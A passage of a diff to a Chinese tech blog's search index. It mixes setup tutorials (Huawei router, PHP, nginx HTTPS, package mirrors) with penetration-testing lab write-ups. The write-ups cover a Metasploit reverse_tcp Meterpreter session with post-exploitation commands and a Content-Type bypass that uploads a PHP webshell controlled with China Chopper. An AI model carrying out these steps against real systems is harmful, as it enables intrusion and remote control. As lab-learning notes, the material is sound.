     <content><![CDATA[<h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><h3 id="路由器设置ip"><a href="#路由器设置ip" class="headerlink" title="路由器设置ip"></a>路由器设置ip</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Huawei&gt;system-view           //进入系统视图</span><br><span class="line">[Huawei]display interface brief     //显示接口信息</span><br><span class="line">[Huawei]interface GigabitEthernet 0/0/0    //进入接口</span><br><span class="line">[Huawei-GigabitEthernet0/0/0]ip address 192.168.1.254 24     //设置ip地址</span><br><span class="line">[Huawei-GigabitEthernet0/0/0]q    //退出</span><br></pre></td></tr></table></figure>
@@ -592,6 +558,40 @@
       <tags>
         <tag>eNSP</tag>
         <tag>华为</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>centos7安装php</title>
+    <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85php/</url>
+    <content><![CDATA[<h2 id="centos7安装php"><a href="#centos7安装php" class="headerlink" title="centos7安装php"></a>centos7安装php</h2><p>环境是apache2+mariadb+php</p>
+<p>先安装php</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install php</span></span><br></pre></td></tr></table></figure>
+
+<p>安装php相关组件</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install php-mysql php-gd php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-bcmath php-mhash</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl restart mariadb</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl restart httpd</span></span><br></pre></td></tr></table></figure>
+
+<p>通过php -v 查看信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/var/www/html#</span><span class="bash"> php -v</span></span><br><span class="line">PHP 5.4.16 (cli) (built: Apr  1 2020 04:07:17)</span><br><span class="line">Copyright (c) 1997-2013 The PHP Group</span><br><span class="line">Zend Engine v2.4.0, Copyright (c) 1998-2013 Zend Technologies</span><br></pre></td></tr></table></figure>
+
+<p>进入/var/www/html目录编写一个测试页面</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/var/www/html#</span><span class="bash"> vim index.php</span></span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最后访问页面，有php相关信息成功</p>
+]]></content>
+      <tags>
+        <tag>centos7</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>first-blog</title>
+    <url>/2021/11/24/first-blog/</url>
+    <content><![CDATA[<h2 id="Test-for-my-first-blog"><a href="#Test-for-my-first-blog" class="headerlink" title="Test for my first blog"></a>Test for my first blog</h2><p>这是正文。</p>
+<p><img src="/2021/11/24/first-blog/image-20211124165347049.png"></p>
+<p>11</p>
+]]></content>
+      <tags>
+        <tag>test</tag>
       </tags>
   </entry>
   <entry>
@@ -622,6 +622,35 @@
 ]]></content>
       <tags>
         <tag>java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>metasploit之meterpreter命令</title>
+    <url>/2021/12/21/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h2 id="metasploit之meterpreter命令"><a href="#metasploit之meterpreter命令" class="headerlink" title="metasploit之meterpreter命令"></a>metasploit之meterpreter命令</h2><h3 id="目的-了解meterpreter命令"><a href="#目的-了解meterpreter命令" class="headerlink" title="目的: 了解meterpreter命令"></a>目的: 了解meterpreter命令</h3><h3 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h3><p><code>ps</code>         查询当前目标机所有进程<br><code>getpid</code>       获取当前会话进程<br><code>getuid</code>       当前用户所用的权限，所在用户组<br><code>sysinfo</code>      取系统信息<br><code>getsystem</code>    提升至system最高权限<br><code>shell</code>      进入cmdshell命令模式<br><code>pwd</code>       查看当前所在位置<br><code>cat</code>        查看文本文件<br><code>ipconfig</code>     查看网络配置信息<br><code>migrate pid</code>   迁移pid<br><code>screenshot</code>    截取当前用户屏幕保存到本地</p>
+<h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，运行msf，<code>use exploit/multi/handler</code>选择exploit，<code>set payload windows/meterpreter/reverse_tcp</code>设置payload，<code>set LHOST 192.168.1.2</code>设置监听主机，<code>set LPORT 11101</code>设置端口</p>
+<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/1.PNG"></p>
+<p>输入<code>exploit -j</code>运行脚本，且在后台监听</p>
+<p>靶机双击桌面运行xx.exe，返回kali，已经取得会话</p>
+<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/2.PNG"></p>
+<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/3.PNG"></p>
+<p>敲击回车，返回msf，执行<code>sessions</code>，查看会话，再执行<code>sessions 1</code>,进入会话</p>
+<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/4.PNG"></p>
+<p>执行<code>ps</code>查看进程</p>
+<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/5.PNG"></p>
+<p><code>getuid</code> 查看权限</p>
+<p><code>pwd</code> 查看当前路径</p>
+<p><code>screentshot</code>截图</p>
+<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/6.PNG"></p>
+<p><code>background</code>会话转入后台</p>
+<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/7.PNG"></p>
+<p>新建终端，进入/root目录下，查看截图</p>
+<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/8.PNG"></p>
+<p>实验结束</p>
+]]></content>
+      <tags>
+        <tag>msf</tag>
+        <tag>meterpreter</tag>
       </tags>
   </entry>
   <entry>
@@ -678,35 +707,6 @@
       </tags>
   </entry>
   <entry>
-    <title>metasploit之meterpreter命令</title>
-    <url>/2021/12/21/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h2 id="metasploit之meterpreter命令"><a href="#metasploit之meterpreter命令" class="headerlink" title="metasploit之meterpreter命令"></a>metasploit之meterpreter命令</h2><h3 id="目的-了解meterpreter命令"><a href="#目的-了解meterpreter命令" class="headerlink" title="目的: 了解meterpreter命令"></a>目的: 了解meterpreter命令</h3><h3 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h3><p><code>ps</code>         查询当前目标机所有进程<br><code>getpid</code>       获取当前会话进程<br><code>getuid</code>       当前用户所用的权限，所在用户组<br><code>sysinfo</code>      取系统信息<br><code>getsystem</code>    提升至system最高权限<br><code>shell</code>      进入cmdshell命令模式<br><code>pwd</code>       查看当前所在位置<br><code>cat</code>        查看文本文件<br><code>ipconfig</code>     查看网络配置信息<br><code>migrate pid</code>   迁移pid<br><code>screenshot</code>    截取当前用户屏幕保存到本地</p>
-<h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，运行msf，<code>use exploit/multi/handler</code>选择exploit，<code>set payload windows/meterpreter/reverse_tcp</code>设置payload，<code>set LHOST 192.168.1.2</code>设置监听主机，<code>set LPORT 11101</code>设置端口</p>
-<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/1.PNG"></p>
-<p>输入<code>exploit -j</code>运行脚本，且在后台监听</p>
-<p>靶机双击桌面运行xx.exe，返回kali，已经取得会话</p>
-<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/2.PNG"></p>
-<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/3.PNG"></p>
-<p>敲击回车，返回msf，执行<code>sessions</code>，查看会话，再执行<code>sessions 1</code>,进入会话</p>
-<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/4.PNG"></p>
-<p>执行<code>ps</code>查看进程</p>
-<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/5.PNG"></p>
-<p><code>getuid</code> 查看权限</p>
-<p><code>pwd</code> 查看当前路径</p>
-<p><code>screentshot</code>截图</p>
-<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/6.PNG"></p>
-<p><code>background</code>会话转入后台</p>
-<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/7.PNG"></p>
-<p>新建终端，进入/root目录下，查看截图</p>
-<p><img src="http://121.5.125.62/image/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/8.PNG"></p>
-<p>实验结束</p>
-]]></content>
-      <tags>
-        <tag>msf</tag>
-        <tag>meterpreter</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>metasploit溢出UnrealIRCd后门漏洞</title>
     <url>/2021/12/21/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h2 id="metasploit溢出UnrealIRCd后门漏洞"><a href="#metasploit溢出UnrealIRCd后门漏洞" class="headerlink" title="metasploit溢出UnrealIRCd后门漏洞"></a>metasploit溢出UnrealIRCd后门漏洞</h2><h3 id="目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限"><a href="#目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限" class="headerlink" title="目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限"></a>目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限</h3><h3 id="原理：某些站点的UnrealIRCd，在DEBUG3-DOLOG-SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。"><a href="#原理：某些站点的UnrealIRCd，在DEBUG3-DOLOG-SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。" class="headerlink" title="原理：某些站点的UnrealIRCd，在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。"></a>原理：某些站点的UnrealIRCd，在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。</h3><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>利用nmap扫描主机，确定<code>6667</code>端口开放，对应服务为<code>unreal ircd</code></p>
@@ -726,6 +726,25 @@
         <tag>unrealircd</tag>
         <tag>后门</tag>
         <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>openssl+nginx+https</title>
+    <url>/2022/09/26/openssl-nginx-https/</url>
+    <content><![CDATA[<h2 id="使用openssl和nginx配置88端口为https协议"><a href="#使用openssl和nginx配置88端口为https协议" class="headerlink" title="使用openssl和nginx配置88端口为https协议"></a>使用openssl和nginx配置88端口为https协议</h2><ul>
+<li>该方法的证书属于无效证书,可以从第三方认证机构购买,原文:<a href="https://www.jb51.net/article/217964.htm">https://www.jb51.net/article/217964.htm</a></li>
+</ul>
+<h3 id="安装nginx（跳过）"><a href="#安装nginx（跳过）" class="headerlink" title="安装nginx（跳过）"></a>安装nginx（跳过）</h3><h3 id="创建CA证书"><a href="#创建CA证书" class="headerlink" title="创建CA证书"></a>创建CA证书</h3><ol>
+<li>生成CA私钥<br><code>root@debian:~# openssl genrsa -out local.key 2048</code><br><img src="http://121.5.125.62/image/openssl-nginx-https/CA%E7%A7%81%E9%92%A5.JPG" alt="CA私钥"></li>
+<li>生成CA证书请求<br><code>root@debian:~# openssl req -new -key local.key -out local.csr</code><br><img src="http://121.5.125.62/image/openssl-nginx-https/CA%E8%AF%81%E4%B9%A6%E8%AF%B7%E6%B1%82.JPG" alt="CA证书请求"></li>
+<li>生成CA根证书<br><code>openssl x509 -req -in local.csr -extensions v3_ca -signkey local.key -out local.crt</code><br><img src="http://121.5.125.62/image/openssl-nginx-https/CA%E6%A0%B9%E8%AF%81%E4%B9%A6.JPG" alt="CA根证书"></li>
+</ol>
+<h3 id="配置nginx"><a href="#配置nginx" class="headerlink" title="配置nginx"></a>配置nginx</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">        listen 88 ssl;                              #监听88端口，并开启ssl</span><br><span class="line">        keepalive_timeout 100;                      #开启keepalive 激活keepalive长连接,减少客户端请求次数</span><br><span class="line">        ssl_certificate /root/local.crt;            #server端证书位置</span><br><span class="line">        ssl_certificate_key /root/local.key;        #server端私钥位置</span><br><span class="line">        ssl_session_cache shared:SSL:10m;           #缓存session会话</span><br><span class="line">        ssl_session_timeout 10m;                    # session会话    10分钟过期</span><br><span class="line">        ssl_ciphers HIGH:!aNULL:!MD5;</span><br><span class="line">        ssl_prefer_server_ciphers on;</span><br><span class="line">        server_name localhost;</span><br><span class="line">        charset utf-8;</span><br><span class="line"></span><br><span class="line">        #默认使用302临时重定向,不改变请求的方法(如post还是post),301永久重定向,307临时重定向不改变请求的方法</span><br><span class="line">        error_page 497 301 =307 https://$host:$server_port$request_uri;   </span><br><span class="line"></span><br><span class="line">        #根目录</span><br><span class="line">        root /var/www/test;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">          index index.html;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>nginx</tag>
+        <tag>openssl</tag>
+        <tag>https</tag>
       </tags>
   </entry>
   <entry>
@@ -754,25 +773,6 @@
       </tags>
   </entry>
   <entry>
-    <title>openssl+nginx+https</title>
-    <url>/2022/09/26/openssl-nginx-https/</url>
-    <content><![CDATA[<h2 id="使用openssl和nginx配置88端口为https协议"><a href="#使用openssl和nginx配置88端口为https协议" class="headerlink" title="使用openssl和nginx配置88端口为https协议"></a>使用openssl和nginx配置88端口为https协议</h2><ul>
-<li>该方法的证书属于无效证书,可以从第三方认证机构购买,原文:<a href="https://www.jb51.net/article/217964.htm">https://www.jb51.net/article/217964.htm</a></li>
-</ul>
-<h3 id="安装nginx（跳过）"><a href="#安装nginx（跳过）" class="headerlink" title="安装nginx（跳过）"></a>安装nginx（跳过）</h3><h3 id="创建CA证书"><a href="#创建CA证书" class="headerlink" title="创建CA证书"></a>创建CA证书</h3><ol>
-<li>生成CA私钥<br><code>root@debian:~# openssl genrsa -out local.key 2048</code><br><img src="http://121.5.125.62/image/openssl-nginx-https/CA%E7%A7%81%E9%92%A5.JPG" alt="CA私钥"></li>
-<li>生成CA证书请求<br><code>root@debian:~# openssl req -new -key local.key -out local.csr</code><br><img src="http://121.5.125.62/image/openssl-nginx-https/CA%E8%AF%81%E4%B9%A6%E8%AF%B7%E6%B1%82.JPG" alt="CA证书请求"></li>
-<li>生成CA根证书<br><code>openssl x509 -req -in local.csr -extensions v3_ca -signkey local.key -out local.crt</code><br><img src="http://121.5.125.62/image/openssl-nginx-https/CA%E6%A0%B9%E8%AF%81%E4%B9%A6.JPG" alt="CA根证书"></li>
-</ol>
-<h3 id="配置nginx"><a href="#配置nginx" class="headerlink" title="配置nginx"></a>配置nginx</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">        listen 88 ssl;                              #监听88端口，并开启ssl</span><br><span class="line">        keepalive_timeout 100;                      #开启keepalive 激活keepalive长连接,减少客户端请求次数</span><br><span class="line">        ssl_certificate /root/local.crt;            #server端证书位置</span><br><span class="line">        ssl_certificate_key /root/local.key;        #server端私钥位置</span><br><span class="line">        ssl_session_cache shared:SSL:10m;           #缓存session会话</span><br><span class="line">        ssl_session_timeout 10m;                    # session会话    10分钟过期</span><br><span class="line">        ssl_ciphers HIGH:!aNULL:!MD5;</span><br><span class="line">        ssl_prefer_server_ciphers on;</span><br><span class="line">        server_name localhost;</span><br><span class="line">        charset utf-8;</span><br><span class="line"></span><br><span class="line">        #默认使用302临时重定向,不改变请求的方法(如post还是post),301永久重定向,307临时重定向不改变请求的方法</span><br><span class="line">        error_page 497 301 =307 https://$host:$server_port$request_uri;   </span><br><span class="line"></span><br><span class="line">        #根目录</span><br><span class="line">        root /var/www/test;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">          index index.html;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>nginx</tag>
-        <tag>openssl</tag>
-        <tag>https</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>python永久换第三方库国内源</title>
     <url>/2021/11/24/python%E6%B0%B8%E4%B9%85%E6%8D%A2%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E5%9B%BD%E5%86%85%E6%BA%90/</url>
     <content><![CDATA[<h2 id="python永久换第三方库国内源"><a href="#python永久换第三方库国内源" class="headerlink" title="python永久换第三方库国内源"></a>python永久换第三方库国内源</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#北京外国语大学镜像站</span></span><br><span class="line">pip config <span class="built_in">set</span> global.index<span class="literal">-url</span> https://mirrors.bfsu.edu.cn/pypi/web/simple</span><br></pre></td></tr></table></figure>
@@ -786,24 +786,6 @@
       <tags>
         <tag>python</tag>
         <tag>pip</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>rust修改默认环境变量与源</title>
-    <url>/2022/02/11/rust%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8E%E6%BA%90/</url>
-    <content><![CDATA[<h2 id="rust修改默认环境变量与源"><a href="#rust修改默认环境变量与源" class="headerlink" title="rust修改默认环境变量与源"></a>rust修改默认环境变量与源</h2><h3 id="0x00-windows-rust"><a href="#0x00-windows-rust" class="headerlink" title="0x00 windows rust"></a>0x00 windows rust</h3><p>当使用windows安装rust时，默认安装位置是C:\User\xxx\.cargo和C:\User\xxx\.rustup</p>
-<p>可以将目录粘贴到指定的文件夹位置，然后配置参数即可</p>
-<p>打开 <em><strong>cmd</strong></em> 配置参数</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">setx CARGO_HOME &quot;D:\Program Files\.cargo&quot;</span><br><span class="line">setx RUSTUP_HOME &quot;D:\Program Files\.rustup&quot;</span><br><span class="line">setx RUSTUP_UPDATE_ROOT http://mirrors.ustc.edu.cn/rust-static/rustup</span><br><span class="line">setx RUSTUP_DIST_SERVER http://mirrors.ustc.edu.cn/rust-static</span><br></pre></td></tr></table></figure>
-
-<p>path 添加%CARGO_HOME%\bin</p>
-<h3 id="0x01-Linux-rust-换源"><a href="#0x01-Linux-rust-换源" class="headerlink" title="0x01 Linux rust 换源"></a>0x01 Linux rust 换源</h3><p>在~/.cargo目录下新建config文件，然后输入以下内容</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[source.crates-io]</span><br><span class="line">registry = &quot;https://github.com/rust-lang/crates.io-index&quot;</span><br><span class="line">replace-with = &#x27;ustc&#x27;</span><br><span class="line">[source.ustc]</span><br><span class="line">registry = &quot;git://mirrors.ustc.edu.cn/crates.io-index&quot;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>rust</tag>
-        <tag>环境变量</tag>
       </tags>
   </entry>
   <entry>
@@ -963,6 +945,24 @@
         <tag>redrock</tag>
         <tag>ctf</tag>
         <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>rust修改默认环境变量与源</title>
+    <url>/2022/02/11/rust%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8E%E6%BA%90/</url>
+    <content><![CDATA[<h2 id="rust修改默认环境变量与源"><a href="#rust修改默认环境变量与源" class="headerlink" title="rust修改默认环境变量与源"></a>rust修改默认环境变量与源</h2><h3 id="0x00-windows-rust"><a href="#0x00-windows-rust" class="headerlink" title="0x00 windows rust"></a>0x00 windows rust</h3><p>当使用windows安装rust时，默认安装位置是C:\User\xxx\.cargo和C:\User\xxx\.rustup</p>
+<p>可以将目录粘贴到指定的文件夹位置，然后配置参数即可</p>
+<p>打开 <em><strong>cmd</strong></em> 配置参数</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">setx CARGO_HOME &quot;D:\Program Files\.cargo&quot;</span><br><span class="line">setx RUSTUP_HOME &quot;D:\Program Files\.rustup&quot;</span><br><span class="line">setx RUSTUP_UPDATE_ROOT http://mirrors.ustc.edu.cn/rust-static/rustup</span><br><span class="line">setx RUSTUP_DIST_SERVER http://mirrors.ustc.edu.cn/rust-static</span><br></pre></td></tr></table></figure>
+
+<p>path 添加%CARGO_HOME%\bin</p>
+<h3 id="0x01-Linux-rust-换源"><a href="#0x01-Linux-rust-换源" class="headerlink" title="0x01 Linux rust 换源"></a>0x01 Linux rust 换源</h3><p>在~/.cargo目录下新建config文件，然后输入以下内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[source.crates-io]</span><br><span class="line">registry = &quot;https://github.com/rust-lang/crates.io-index&quot;</span><br><span class="line">replace-with = &#x27;ustc&#x27;</span><br><span class="line">[source.ustc]</span><br><span class="line">registry = &quot;git://mirrors.ustc.edu.cn/crates.io-index&quot;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>rust</tag>
+        <tag>环境变量</tag>
       </tags>
   </entry>
   <entry>
@@ -1556,25 +1556,6 @@
       </tags>
   </entry>
   <entry>
-    <title>正则表达式</title>
-    <url>/2021/11/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
-    <content><![CDATA[<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>.表示任意单个字符（除了换行符）</p>
-<p>[]表示里面的任何一个字符</p>
-<p>a{1，5}表示a有1到5之间个字符</p>
-<p>{0，}表示0个或者无穷个</p>
-<p>*表示{0，}</p>
-<p>+表示{1，}</p>
-<p>？表示{0，1}</p>
-<p>[^a,b,c]表示除了a,b,c的其他字符</p>
-<p>^是字符串开头</p>
-<p>$是字符串结尾</p>
-<p>（？&lt;=（a））表示以a开头</p>
-<p>（？=（a））表示以a结尾</p>
-<p>\d , \w  , \ s 匹配数字，字符，空格</p>
-<p>\D , \W  ,\S 匹配非数字，非字符，非空格</p>
-]]></content>
-  </entry>
-  <entry>
     <title>图片木马绕过文件内容检测上传webshell</title>
     <url>/2021/12/27/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/</url>
     <content><![CDATA[<h2 id="图片木马绕过文件内容检测上传webshell"><a href="#图片木马绕过文件内容检测上传webshell" class="headerlink" title="图片木马绕过文件内容检测上传webshell"></a>图片木马绕过文件内容检测上传webshell</h2><p>目的：</p>
@@ -1615,6 +1596,67 @@
       <tags>
         <tag>tools</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>绕过content_type检测文件类型上传webshell</title>
+    <url>/2021/12/27/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/</url>
+    <content><![CDATA[<h2 id="绕过content-type检测文件类型上传webshell"><a href="#绕过content-type检测文件类型上传webshell" class="headerlink" title="绕过content_type检测文件类型上传webshell"></a>绕过content_type检测文件类型上传webshell</h2><p>目的:</p>
+<ul>
+<li>理解绕过Content-Type检测文件类型上传的原理</li>
+<li>学习绕过Content-Type检测文件类型上传的过程</li>
+</ul>
+<p>原理:</p>
+<ul>
+<li>当浏览器在上传文件到服务器的时候，服务器对说上传文件的Content-Type类型进行检测，如果是白名单允许的，则可以正常上传，否则上传失败。</li>
+<li>绕过Content–Type文件类型检测，就是用BurpSuite截取并修改数据包中文件的Content-Type类型，使其符合白名单的规则，达到上传的目的。</li>
+</ul>
+<p>过程：</p>
+<ul>
+<li><p>打开火狐浏览器，修改代理127.0.0.1:8080<img src="http://121.5.125.62/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103046467.png" alt="image-20211228103046467"></p>
+</li>
+<li><p>打开burp，点击intercept is off<img src="http://121.5.125.62/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103152265.png" alt="image-20211228103152265"></p>
+</li>
+<li><p>打开浏览器,输入<a href="http://192.168.1.3:8080/up,%E8%BF%9B%E5%85%A5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA%E8%84%9A%E6%9C%AC%EF%BC%8C%E7%82%B9%E5%87%BBcontent_type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell%E3%80%82![image-20211228103256712](http://121.5.125.62/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103256712.png)">http://192.168.1.3:8080/up,进入文件上传漏洞演示脚本，点击content_type检测文件类型上传webshell。![image-20211228103256712](http://121.5.125.62/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103256712.png)</a></p>
+</li>
+<li><p>上传php文件，前台显示错误窗口<img src="http://121.5.125.62/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103342121.png" alt="image-20211228103342121"></p>
+</li>
+<li><p>Burp开启抓包</p>
+</li>
+<li><p>Burp抓到的数据包,在数据包中的content-type的application-stream修改为image/gif<img src="http://121.5.125.62/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103504817.png" alt="image-20211228103504817"></p>
+</li>
+<li><p>点击forward，发送数据包，前台提示上传lubr.php成功<img src="http://121.5.125.62/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103538500.png" alt="image-20211228103538500"></p>
+</li>
+<li><p>浏览器输入地址<a href="http://192.168.1.3:8080/up/uploads/lubr.php%EF%BC%8C%E9%A1%B5%E9%9D%A2%E6%B2%A1%E6%9C%89%E9%94%99%E8%AF%AF%E6%8F%90%E7%A4%BA![image-20211228103621026](http://121.5.125.62/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103621026.png)">http://192.168.1.3:8080/up/uploads/lubr.php，页面没有错误提示![image-20211228103621026](http://121.5.125.62/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103621026.png)</a></p>
+</li>
+<li><p>打开中国菜刀，添加木马地址，密码，lubr，脚本类型php(eval)，点击添加<img src="http://121.5.125.62/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103730160.png" alt="image-20211228103730160"></p>
+</li>
+<li><p>双击添加记录，可查看完整目录<img src="http://121.5.125.62/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103747989.png" alt="image-20211228103747989"></p>
+</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>webshell</tag>
+        <tag>content_type</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>正则表达式</title>
+    <url>/2021/11/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
+    <content><![CDATA[<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>.表示任意单个字符（除了换行符）</p>
+<p>[]表示里面的任何一个字符</p>
+<p>a{1，5}表示a有1到5之间个字符</p>
+<p>{0，}表示0个或者无穷个</p>
+<p>*表示{0，}</p>
+<p>+表示{1，}</p>
+<p>？表示{0，1}</p>
+<p>[^a,b,c]表示除了a,b,c的其他字符</p>
+<p>^是字符串开头</p>
+<p>$是字符串结尾</p>
